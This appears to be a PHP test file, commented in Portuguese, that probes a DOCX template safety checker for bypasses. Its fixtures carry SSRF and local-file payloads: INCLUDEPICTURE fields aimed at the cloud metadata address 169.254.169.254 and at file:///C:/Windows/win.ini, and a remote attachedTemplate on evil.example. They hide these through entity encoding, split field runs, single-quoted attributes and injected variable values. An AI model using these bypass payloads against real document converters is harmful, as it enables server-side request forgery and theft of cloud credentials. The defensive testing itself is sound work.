<?php

use App\Enums\DocumentVersionKind;
use App\Models\Document;
use App\Models\Envelope;
use App\Models\Template;
use App\Services\Templates\DocxSafety;
use App\Services\Templates\TemplateRejectedException;
use Illuminate\Support\Facades\Storage;
use Tests\Feature\Pdf\Support\PdfFixtures;

require_once __DIR__.'/../../Phase2/Templates/Support/TemplateHelpers.php';

/*
|--------------------------------------------------------------------------
| Revisão adversarial da Fase 2, onda A — DocxSafety (modelos DOCX)
|--------------------------------------------------------------------------
| docs/fase-2/modelos.md §4 promete recusar DOCX com campos INCLUDETEXT/INCLUDEPICTURE/DDE e
| com relacionamento externo que não seja hyperlink, porque o LibreOffice buscaria o conteúdo
| ao converter (SSRF/LFI). A checagem é feita por expressão regular sobre o XML BRUTO, e o XML
| tem mais de uma grafia para o mesmo conteúdo:
|
|  - referência de caractere (`&#73;` = "I") — o parser vê INCLUDEPICTURE, a regex não;
|  - instrução de campo dividida em vários `<w:instrText>` (o próprio Word faz isso) — a regex
|    junta os pedaços com espaço ("INCLUDE PICTURE") e não reconhece a palavra;
|  - atributo XML entre aspas simples (`TargetMode='External'`) — a regex só aceita aspas duplas;
|  - e o DOCX PREENCHIDO nunca é reinspecionado: um valor de variável colocado dentro de um
|    `<w:instrText>` vira a instrução do campo.
*/

if (! function_exists('rv2domDocx')) {
    /**
     * DOCX mínimo com o corpo XML informado (já em WordprocessingML) e partes extras.
     *
     * @param  array<string, string>  $extra
     */
    function rv2domDocx(string $path, string $bodyXml, array $extra = []): string
    {
        $zip = new ZipArchive;
        $zip->open($path, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        $zip->addFromString('[Content_Types].xml', '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>');
        $zip->addFromString('_rels/.rels', '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>');
        $zip->addFromString('word/document.xml', '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>'.$bodyXml.'</w:body></w:document>');
        $zip->addFromString('word/settings.xml', '<?xml version="1.0" encoding="UTF-8"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>');

        foreach ($extra as $name => $content) {
            $zip->addFromString($name, $content);
        }

        $zip->close();

        return $path;
    }
}

if (! function_exists('rv2domField')) {
    /**
     * Campo complexo do Word: begin → instrText(s) → separate → resultado → end.
     *
     * @param  list<string>  $instructionRuns  conteúdo XML de cada `<w:instrText>`
     */
    function rv2domField(array $instructionRuns): string
    {
        $runs = implode('', array_map(
            fn (string $part): string => '<w:r><w:instrText xml:space="preserve">'.$part.'</w:instrText></w:r>',
            $instructionRuns,
        ));

        return '<w:p><w:r><w:t xml:space="preserve">Olá ${nome}</w:t></w:r></w:p>'
            .'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'.$runs
            .'<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>imagem</w:t></w:r>'
            .'<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
    }
}

if (! function_exists('rv2domInstruction')) {
    /**
     * A instrução do campo como um leitor de XML a vê (entidades resolvidas, runs concatenados —
     * é assim que Word e LibreOffice montam a instrução).
     */
    function rv2domInstruction(string $docxPath): string
    {
        $zip = new ZipArchive;
        $zip->open($docxPath);
        $xml = (string) $zip->getFromName('word/document.xml');
        $zip->close();

        $dom = new DOMDocument;
        $dom->loadXML($xml);

        $text = '';

        foreach ($dom->getElementsByTagNameNS('http://schemas.openxmlformats.org/wordprocessingml/2006/main', 'instrText') as $node) {
            $text .= $node->textContent;
        }

        return $text;
    }
}

beforeEach(function () {
    $this->work = templatesWorkspace();
});

afterEach(fn () => PdfFixtures::cleanup($this->work ?? null));

test('INCLUDEPICTURE escrito com referência de caractere (&#73;) passa pela DocxSafety', function () {
    $path = rv2domDocx($this->work.'/entidade.docx', rv2domField([
        ' &#73;NCLUDEPICTURE "http://169.254.169.254/latest/meta-data/" ',
    ]));

    // O que Word/LibreOffice leem é INCLUDEPICTURE — um campo que busca a URL ao renderizar.
    expect(trim(rv2domInstruction($path)))->toStartWith('INCLUDEPICTURE "http://169.254.169.254/');

    expect(fn () => app(DocxSafety::class)->assertSafe($path))
        ->toThrow(TemplateRejectedException::class);
});

test('INCLUDEPICTURE dividido em dois <w:instrText> (como o Word grava) passa pela DocxSafety', function () {
    $path = rv2domDocx($this->work.'/dividido.docx', rv2domField([
        ' INCLUDE',
        'PICTURE "file:///C:/Windows/win.ini" ',
    ]));

    expect(trim(rv2domInstruction($path)))->toBe('INCLUDEPICTURE "file:///C:/Windows/win.ini"');

    expect(fn () => app(DocxSafety::class)->assertSafe($path))
        ->toThrow(TemplateRejectedException::class);
});

test('attachedTemplate remoto com TargetMode entre aspas simples passa pela DocxSafety', function () {
    $rels = "<?xml version='1.0' encoding='UTF-8'?><Relationships xmlns='http://schemas.openxmlformats.org/package/2006/relationships'>"
        ."<Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate' Target='http://evil.example/modelo.dotm' TargetMode='External'/>"
        .'</Relationships>';

    $path = rv2domDocx($this->work.'/aspas-simples.docx', '<w:p><w:r><w:t>Olá ${nome}</w:t></w:r></w:p>', [
        'word/_rels/settings.xml.rels' => $rels,
    ]);

    // Para um leitor de XML, é exatamente o relacionamento externo que a regra quer recusar.
    $dom = new DOMDocument;
    $dom->loadXML($rels);
    $relationship = $dom->getElementsByTagName('Relationship')->item(0);

    expect($relationship?->getAttribute('TargetMode'))->toBe('External');

    expect(fn () => app(DocxSafety::class)->assertSafe($path))
        ->toThrow(TemplateRejectedException::class);
});

test('valor de variável dentro de um campo vira instrução INCLUDEPICTURE no DOCX gerado, que nunca é reinspecionado', function () {
    ['organization' => $organization, 'owner' => $owner] = createOrganizationWithOwner();
    templatesEnable($organization);
    actingAsMember($owner, $organization);

    // Modelo aceito: a instrução do campo é só o marcador.
    $source = rv2domDocx($this->work.'/modelo.docx', rv2domField([' ${referencia} ']));

    expect(fn () => app(DocxSafety::class)->assertSafe($source))->not->toThrow(TemplateRejectedException::class);

    $this->post(route('templates.store'), [
        'name' => 'Contrato Word',
        'source_type' => 'docx',
        'file' => templateUpload($source, 'contrato.docx'),
    ])->assertSessionHasNoErrors();

    $template = Template::query()->firstOrFail();

    $this->put(route('templates.update', $template), [
        'variables' => [
            ['key' => 'nome', 'label' => 'Nome', 'type' => 'text', 'required' => true],
            ['key' => 'referencia', 'label' => 'Referência', 'type' => 'text', 'required' => true],
        ],
        'roles' => [['ref' => 'r1', 'name' => 'Locatário', 'participant_role' => 'signer']],
    ])->assertSessionHasNoErrors();

    $roleIds = templateRoleIds($template);

    // Quem USA o modelo (basta create_envelopes) digita o valor.
    $response = $this->post(route('templates.use', $template), [
        'values' => [
            'nome' => 'Ana Souza',
            'referencia' => 'INCLUDEPICTURE "http://169.254.169.254/latest/meta-data/"',
        ],
        'participants' => [$roleIds['Locatário'] => ['name' => 'Ana Souza', 'email' => 'ana@example.com']],
    ]);

    $envelope = Envelope::query()->first();

    if ($envelope === null) {
        // Recusar o valor também seria uma defesa aceitável.
        $response->assertSessionHasErrors();

        return;
    }

    $document = Document::query()->where('envelope_id', $envelope->id)->firstOrFail();
    $original = $document->versions()->where('kind', DocumentVersionKind::Original->value)->firstOrFail();

    $generated = $this->work.'/gerado.docx';
    file_put_contents($generated, Storage::disk('documents')->get($original->storage_path));

    // O DOCX que segue para a conversão tem o campo que o modelo não podia ter.
    expect(trim(rv2domInstruction($generated)))->toStartWith('INCLUDEPICTURE "http://169.254.169.254/');

    // O arquivo gerado precisa obedecer às mesmas regras do modelo.
    expect(fn () => app(DocxSafety::class)->assertSafe($generated))
        ->not->toThrow(TemplateRejectedException::class);
});
